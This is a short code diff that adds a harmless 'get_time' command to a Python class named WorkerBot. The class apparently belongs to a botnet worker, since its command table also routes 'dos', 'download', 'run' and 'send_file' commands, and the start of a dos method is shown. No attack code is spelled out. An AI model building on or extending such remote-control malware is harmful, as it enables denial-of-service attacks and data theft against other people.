@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 
+import datetime
 import gevent
 import os
 import platform
@@ -163,12 +164,19 @@ class WorkerBot(BaseWorkerBot):
         return (
             ('dos (?P<url>.*)', self.dos),
             ('download (?P<url>.*)', self.download),
+            ('get_time(?: (?P<format>.+))?', self.get_time),
             ('info', self.info),
             ('ports', self.ports),
             ('run (?P<program>.*)', self.run),
             ('send_file (?P<filename>[^\s]+) (?P<destination>[^\s]+)', self.send_file),
             ('status', self.status_report),
         )
+    
+    def get_time(self, format=None):
+        now = datetime.datetime.now() # remember to import datetime at the top of the module
+        if format:
+            return now.strftime(format)
+        return str(now)
     
     def dos(self, url):
         count = 0
